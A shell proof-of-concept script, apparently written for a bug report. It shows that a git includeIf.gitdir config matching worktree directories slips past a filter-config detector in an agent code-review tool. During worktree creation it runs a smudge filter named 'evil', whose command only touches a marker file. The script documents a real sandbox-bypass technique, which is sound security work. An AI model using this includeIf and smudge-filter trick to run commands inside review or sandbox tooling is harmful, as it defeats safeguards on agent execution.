#!/bin/sh
# Reproduces: includeIf.gitdir:<repo>/.git/worktrees/** is invisible to
# has_executable_local_filter_config_v2 before the disposable worktree
# exists (it only matches once a worktree admin dir is present), then
# activates a filter.evil.smudge during `git worktree add`. acquire_diff_v2
# returns success while the smudge command has already executed.
#
# Usage: TOOLREPO=/path/to/checkout ./01_includeif_worktree_bypass.sh
set -eu
TOOLREPO="${TOOLREPO:-/opt/agent-tools/ar-200d-successor}"
PY="${PY:-/opt/agent-tools/aiops-orchestrator-toolrepo/.venv/bin/python}"

T=$(mktemp -d /tmp/includeif-bypass.XXXXXX)
cd "$T"
git init -q r2 && cd r2
git config user.email a@b.c && git config user.name t
echo hello > f.txt && git add -A && git commit -qm base
BASE=$(git rev-parse HEAD)
echo world >> f.txt
printf 'f.txt filter=evil\n' > .gitattributes
git add -A && git commit -qm head
HEAD2=$(git rev-parse HEAD)

cat > "$T/inc.cfg" <<CFG
[filter "evil"]
	smudge = touch $T/INCLUDEIF_RAN
	required = false
CFG
git config "includeIf.gitdir:$T/r2/.git/worktrees/**.path" "$T/inc.cfg"

echo "-- detector result BEFORE the disposable worktree is created --"
PYTHONPATH="$TOOLREPO" "$PY" -c "
from pathlib import Path
from app.agent_review._sealed_git_execution_v2 import has_executable_local_filter_config_v2, sealed_git_child_env_v2
print('detector:', has_executable_local_filter_config_v2(Path('$T/r2'), env=sealed_git_child_env_v2()))
"

rm -f "$T/INCLUDEIF_RAN"
echo "-- acquire_diff_v2 outcome --"
PYTHONPATH="$TOOLREPO" "$PY" -c "
from pathlib import Path
from app.agent_review.diff_acquisition_v2 import acquire_diff_v2, DiffAcquisitionError
try:
    acquire_diff_v2(Path('$T/r2'), base_sha='$BASE', head_sha='$HEAD2')
    print('acquisition: SUCCESS')
except DiffAcquisitionError as e:
    print('acquisition REFUSED:', e.reason_code)
"

if [ -f "$T/INCLUDEIF_RAN" ]; then
    echo "CONFIRMED: filter driver executed via includeIf.gitdir bypass"
else
    echo "not reproduced: marker absent"
fi
